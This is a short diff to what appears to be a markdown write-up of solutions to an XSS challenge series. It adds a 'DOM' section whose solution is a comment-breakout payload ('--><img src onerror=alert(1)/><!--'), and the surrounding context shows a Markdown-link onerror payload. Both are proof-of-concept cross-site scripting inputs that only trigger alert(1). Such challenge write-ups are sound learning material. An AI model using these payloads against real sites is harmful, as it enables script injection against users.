@@ -7,6 +7,7 @@
 - [Adobe](#adobe)
 - [JSON](#json)
 - [Markdown](#markdown)
+- [DOM](#dom)
 - [Skandia](#skandia)
 - [JSON2](#json2)
 
@@ -79,6 +80,14 @@ function escape(s) {
 
 ```
 [[x|http://onerror=javascript:alert(1)//]]
+```
+
+## DOM
+
+- Solution
+
+```
+Comment#--><img src onerror=alert(1)/><!--
 ```
 
 ## Skandia
